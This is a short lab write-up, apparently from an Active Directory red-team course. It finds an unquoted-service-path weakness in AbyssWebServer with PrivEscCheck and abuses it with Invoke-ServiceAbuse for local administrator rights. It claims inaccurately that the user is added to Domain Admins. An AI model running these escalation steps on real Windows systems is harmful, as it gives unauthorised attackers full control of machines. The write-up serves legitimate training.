* Service abused on the student VM for local privilege escalation

```
AbyssWebServer
```

---

Solution :

Check for privilege escalation paths using `PrivEscCheck.ps1`

```
Invoke-PrivEscCheck
```

There we got a service vulnerable to `Service unquoted paths`

```
[*] Status: Vulnerable - High

Name           : AbyssWebServer
ImagePath      : C:\WebServer\Abyss Web Server\abyssws.exe -service
User           : LocalSystem
Status         : Stopped
UserCanStart   : True
UserCanStop    : True
ModifiablePath : C:\WebServer
Vulnerable     : True
```

For further exploitation we can use `Invoke-ServiceAbuse`

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student529
```

This will add our local user student529 to Domain Admins Group. 
Just logoff and logon again and we have local administrator privileges!